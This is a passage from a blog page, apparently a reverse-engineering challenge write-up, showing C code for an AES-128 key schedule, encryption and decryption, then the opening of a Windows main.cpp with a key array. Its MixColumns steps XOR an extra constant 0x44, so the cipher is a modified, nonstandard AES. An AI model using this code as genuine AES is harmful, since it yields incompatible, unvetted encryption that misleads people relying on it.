&lt;&lt;&lt; 1 byte</span></span><br><span class="line"><span class="comment"> *  Row2: s2  s6  s10 s14   &lt;&lt;&lt; 2 bytes</span></span><br><span class="line"><span class="comment"> *  Row3: s3  s7  s11 s15   &lt;&lt;&lt; 3 bytes</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">shift_rows</span><span class="params">(<span class="type">uint8_t</span> *state)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> temp;</span><br><span class="line">    <span class="comment">// row1</span></span><br><span class="line">    temp        = *(state<span class="number">+1</span>);</span><br><span class="line">    *(state<span class="number">+1</span>)  = *(state<span class="number">+5</span>);</span><br><span class="line">    *(state<span class="number">+5</span>)  = *(state<span class="number">+9</span>);</span><br><span class="line">    *(state<span class="number">+9</span>)  = *(state<span class="number">+13</span>);</span><br><span class="line">    *(state<span class="number">+13</span>) = temp;</span><br><span class="line">    <span class="comment">// row2</span></span><br><span class="line">    temp        = *(state<span class="number">+2</span>);</span><br><span class="line">    *(state<span class="number">+2</span>)  = *(state<span class="number">+10</span>);</span><br><span class="line">    *(state<span class="number">+10</span>) = temp;</span><br><span class="line">    temp        = *(state<span class="number">+6</span>);</span><br><span class="line">    *(state<span class="number">+6</span>)  = *(state<span class="number">+14</span>);</span><br><span class="line">    *(state<span class="number">+14</span>) = temp;</span><br><span class="line">    <span class="comment">// row3</span></span><br><span class="line">    temp        = *(state<span class="number">+15</span>);</span><br><span class="line">    *(state<span class="number">+15</span>) = *(state<span class="number">+11</span>);</span><br><span class="line">    *(state<span class="number">+11</span>) = *(state<span class="number">+7</span>);</span><br><span class="line">    *(state<span class="number">+7</span>)  = *(state<span class="number">+3</span>);</span><br><span class="line">    *(state<span class="number">+3</span>)  = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @purpose:    Inverse ShiftRows</span></span><br><span class="line"><span class="comment"> * @description</span></span><br><span class="line"><span class="comment"> *  Row0: s0  s4  s8  s12   &gt;&gt;&gt; 0 byte</span></span><br><span class="line"><span class="comment"> *  Row1: s1  s5  s9  s13   &gt;&gt;&gt; 1 byte</span></span><br><span class="line"><span class="comment"> *  Row2: s2  s6  s10 s14   &gt;&gt;&gt; 2 bytes</span></span><br><span class="line"><span class="comment"> *  Row3: s3  s7  s11 s15   &gt;&gt;&gt; 3 bytes</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">inv_shift_rows</span><span class="params">(<span class="type">uint8_t</span> *state)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> temp;</span><br><span class="line">    <span class="comment">// row1</span></span><br><span class="line">    temp        = *(state<span class="number">+13</span>);</span><br><span class="line">    *(state<span class="number">+13</span>) = *(state<span class="number">+9</span>);</span><br><span class="line">    *(state<span class="number">+9</span>)  = *(state<span class="number">+5</span>);</span><br><span class="line">    *(state<span class="number">+5</span>)  = *(state<span class="number">+1</span>);</span><br><span class="line">    *(state<span class="number">+1</span>)  = temp;</span><br><span class="line">    <span class="comment">// row2</span></span><br><span class="line">    temp        = *(state<span class="number">+14</span>);</span><br><span class="line">    *(state<span class="number">+14</span>) = *(state<span class="number">+6</span>);</span><br><span class="line">    *(state<span class="number">+6</span>)  = temp;</span><br><span class="line">    temp        = *(state<span class="number">+10</span>);</span><br><span class="line">    *(state<span class="number">+10</span>) = *(state<span class="number">+2</span>);</span><br><span class="line">    *(state<span class="number">+2</span>)  = temp;</span><br><span class="line">    <span class="comment">// row3</span></span><br><span class="line">    temp        = *(state<span class="number">+3</span>);</span><br><span class="line">    *(state<span class="number">+3</span>)  = *(state<span class="number">+7</span>);</span><br><span class="line">    *(state<span class="number">+7</span>)  = *(state<span class="number">+11</span>);</span><br><span class="line">    *(state<span class="number">+11</span>) = *(state<span class="number">+15</span>);</span><br><span class="line">    *(state<span class="number">+15</span>) = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_key_schedule_128</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint8_t</span> *roundkeys)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> temp[<span class="number">4</span>];</span><br><span class="line">    <span class="type">uint8_t</span> *last4bytes; <span class="comment">// point to the last 4 bytes of one round</span></span><br><span class="line">    <span class="type">uint8_t</span> *lastround;</span><br><span class="line">    <span class="type">uint8_t</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">        *roundkeys++ = *key++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    last4bytes = roundkeys<span class="number">-4</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; AES_ROUNDS; ++i) &#123;</span><br><span class="line">        <span class="comment">// k0-k3 for next round</span></span><br><span class="line">        temp[<span class="number">3</span>] = SBOX[*last4bytes++];</span><br><span class="line">        temp[<span class="number">0</span>] = SBOX[*last4bytes++];</span><br><span class="line">        temp[<span class="number">1</span>] = SBOX[*last4bytes++];</span><br><span class="line">        temp[<span class="number">2</span>] = SBOX[*last4bytes++];</span><br><span class="line">        temp[<span class="number">0</span>] ^= RC[i];</span><br><span class="line">        lastround = roundkeys<span class="number">-16</span>;</span><br><span class="line">        *roundkeys++ = temp[<span class="number">0</span>] ^ *lastround++;</span><br><span class="line">        *roundkeys++ = temp[<span class="number">1</span>] ^ *lastround++;</span><br><span class="line">        *roundkeys++ = temp[<span class="number">2</span>] ^ *lastround++;</span><br><span class="line">        *roundkeys++ = temp[<span class="number">3</span>] ^ *lastround++;</span><br><span class="line">        <span class="comment">// k4-k7 for next round        </span></span><br><span class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</span><br><span class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</span><br><span class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</span><br><span class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</span><br><span class="line">        <span class="comment">// k8-k11 for next round</span></span><br><span class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</span><br><span class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</span><br><span class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</span><br><span class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</span><br><span class="line">        <span class="comment">// k12-k15 for next round</span></span><br><span class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</span><br><span class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</span><br><span class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</span><br><span class="line">        *roundkeys++ = *last4bytes++ ^ *lastround++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_encrypt_128</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *roundkeys, <span class="type">const</span> <span class="type">uint8_t</span> *plaintext, <span class="type">uint8_t</span> *ciphertext)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> tmp[<span class="number">16</span>], t;</span><br><span class="line">    <span class="type">uint8_t</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// first AddRoundKey</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; AES_BLOCK_SIZE; ++i ) &#123;</span><br><span class="line">        *(ciphertext+i) = *(plaintext+i) ^ *roundkeys++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9 rounds</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; AES_ROUNDS; ++j) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// SubBytes</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; AES_BLOCK_SIZE; ++i) &#123;</span><br><span class="line">            *(tmp+i) = SBOX[*(ciphertext+i)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">shift_rows</span>(tmp);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * MixColumns </span></span><br><span class="line"><span class="comment">         * [02 03 01 01]   [s0  s4  s8  s12]</span></span><br><span class="line"><span class="comment">         * [01 02 03 01] . [s1  s5  s9  s13]</span></span><br><span class="line"><span class="comment">         * [01 01 02 03]   [s2  s6  s10 s14]</span></span><br><span class="line"><span class="comment">         * [03 01 01 02]   [s3  s7  s11 s15]</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; AES_BLOCK_SIZE; i+=<span class="number">4</span>)  &#123;</span><br><span class="line">            t = tmp[i] ^ tmp[i<span class="number">+1</span>] ^ tmp[i<span class="number">+2</span>] ^ tmp[i<span class="number">+3</span>];</span><br><span class="line">            ciphertext[i]   = <span class="built_in">mul2</span>(tmp[i]   ^ tmp[i<span class="number">+1</span>]) ^ tmp[i]   ^ t ^ <span class="number">0x44</span>;</span><br><span class="line">            ciphertext[i<span class="number">+1</span>] = <span class="built_in">mul2</span>(tmp[i<span class="number">+1</span>] ^ tmp[i<span class="number">+2</span>]) ^ tmp[i<span class="number">+1</span>] ^ t ^ <span class="number">0x44</span>;</span><br><span class="line">            ciphertext[i<span class="number">+2</span>] = <span class="built_in">mul2</span>(tmp[i<span class="number">+2</span>] ^ tmp[i<span class="number">+3</span>]) ^ tmp[i<span class="number">+2</span>] ^ t ^ <span class="number">0x44</span>;</span><br><span class="line">            ciphertext[i<span class="number">+3</span>] = <span class="built_in">mul2</span>(tmp[i<span class="number">+3</span>] ^ tmp[i]  ) ^ tmp[i<span class="number">+3</span>] ^ t ^ <span class="number">0x44</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AddRoundKey</span></span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; AES_BLOCK_SIZE; ++i ) &#123;</span><br><span class="line">            *(ciphertext+i) ^= *roundkeys++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// last round</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; AES_BLOCK_SIZE; ++i) &#123;</span><br><span class="line">        *(ciphertext+i) = SBOX[*(ciphertext+i)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">shift_rows</span>(ciphertext);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; AES_BLOCK_SIZE; ++i ) &#123;</span><br><span class="line">        *(ciphertext+i) ^= *roundkeys++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_decrypt_128</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *roundkeys, <span class="type">const</span> <span class="type">uint8_t</span> *ciphertext, <span class="type">uint8_t</span> *plaintext)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> tmp[<span class="number">16</span>];</span><br><span class="line">    <span class="type">uint8_t</span> t, u, v;</span><br><span class="line">    <span class="type">uint8_t</span> i, j;</span><br><span class="line"></span><br><span class="line">    roundkeys += <span class="number">160</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// first round</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; AES_BLOCK_SIZE; ++i ) &#123;</span><br><span class="line">        *(plaintext+i) = *(ciphertext+i) ^ *(roundkeys+i);</span><br><span class="line">    &#125;</span><br><span class="line">    roundkeys -= <span class="number">16</span>;</span><br><span class="line">    <span class="built_in">inv_shift_rows</span>(plaintext);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; AES_BLOCK_SIZE; ++i) &#123;</span><br><span class="line">        *(plaintext+i) = INV_SBOX[*(plaintext+i)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; AES_ROUNDS; ++j) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Inverse AddRoundKey</span></span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; AES_BLOCK_SIZE; ++i ) &#123;</span><br><span class="line">            *(tmp+i) = *(plaintext+i) ^ *(roundkeys+i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Inverse MixColumns</span></span><br><span class="line"><span class="comment">         * [0e 0b 0d 09]   [s0  s4  s8  s12]</span></span><br><span class="line"><span class="comment">         * [09 0e 0b 0d] . [s1  s5  s9  s13]</span></span><br><span class="line"><span class="comment">         * [0d 09 0e 0b]   [s2  s6  s10 s14]</span></span><br><span class="line"><span class="comment">         * [0b 0d 09 0e]   [s3  s7  s11 s15]</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; AES_BLOCK_SIZE; i+=<span class="number">4</span>) &#123;</span><br><span class="line">            t = tmp[i] ^ tmp[i<span class="number">+1</span>] ^ tmp[i<span class="number">+2</span>] ^ tmp[i<span class="number">+3</span>];</span><br><span class="line">            plaintext[i]   = t ^ tmp[i]   ^ <span class="built_in">mul2</span>(tmp[i]   ^ tmp[i<span class="number">+1</span>]);</span><br><span class="line">            plaintext[i<span class="number">+1</span>] = t ^ tmp[i<span class="number">+1</span>] ^ <span class="built_in">mul2</span>(tmp[i<span class="number">+1</span>] ^ tmp[i<span class="number">+2</span>]);</span><br><span class="line">            plaintext[i<span class="number">+2</span>] = t ^ tmp[i<span class="number">+2</span>] ^ <span class="built_in">mul2</span>(tmp[i<span class="number">+2</span>] ^ tmp[i<span class="number">+3</span>]);</span><br><span class="line">            plaintext[i<span class="number">+3</span>] = t ^ tmp[i<span class="number">+3</span>] ^ <span class="built_in">mul2</span>(tmp[i<span class="number">+3</span>] ^ tmp[i]);</span><br><span class="line">            u = <span class="built_in">mul2</span>(<span class="built_in">mul2</span>(tmp[i]   ^ tmp[i<span class="number">+2</span>]));</span><br><span class="line">            v = <span class="built_in">mul2</span>(<span class="built_in">mul2</span>(tmp[i<span class="number">+1</span>] ^ tmp[i<span class="number">+3</span>]));</span><br><span class="line">            t = <span class="built_in">mul2</span>(u ^ v);</span><br><span class="line">            plaintext[i]   ^= t ^ u ^ <span class="number">0x44</span>;</span><br><span class="line">            plaintext[i<span class="number">+1</span>] ^= t ^ v ^ <span class="number">0x44</span>;</span><br><span class="line">            plaintext[i<span class="number">+2</span>] ^= t ^ u ^ <span class="number">0x44</span>;</span><br><span class="line">            plaintext[i<span class="number">+3</span>] ^= t ^ v ^ <span class="number">0x44</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Inverse ShiftRows</span></span><br><span class="line">        <span class="built_in">inv_shift_rows</span>(plaintext);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Inverse SubBytes</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; AES_BLOCK_SIZE; ++i) &#123;</span><br><span class="line">            *(plaintext+i) = INV_SBOX[*(plaintext+i)];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        roundkeys -= <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// last AddRoundKey</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; AES_BLOCK_SIZE; ++i ) &#123;</span><br><span class="line">        *(plaintext+i) ^= *(roundkeys+i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;aes.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">176</span>] = &#123;</span><br><span class="line">    <span 